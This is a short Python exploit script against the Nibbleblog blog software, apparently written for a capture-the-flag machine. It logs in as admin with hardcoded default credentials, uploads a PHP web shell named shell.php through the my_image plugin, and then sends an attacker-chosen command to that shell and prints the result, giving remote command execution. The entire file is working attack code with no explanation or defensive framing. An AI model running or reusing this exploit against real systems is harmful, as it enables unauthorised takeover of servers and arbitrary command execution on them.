import requests
import sys
from io import BytesIO

if len(sys.argv) < 3:
	print('usage: python exploit.py RHOST COMMAND')
	exit()

ip = sys.argv[1]
url = f"http://{ip}/nibbleblog/"
cmd = sys.argv[2]

session = requests.Session()

#login part
login = session.post(url+"admin.php",data={"username":"admin","password":"nibbles"})
file = BytesIO(b"<?php system($_REQUEST['cmd']);?>")
upload = session.post(url+"admin.php?controller=plugins&action=config&plugin=my_image",data={"plugin":"my_image","title":"My image","position":"4","caption":"test"},files={"image":("shell.php",file)})
shell = session.post(url+"content/private/plugins/my_image/image.php",data={"cmd":cmd})
print(shell.text)
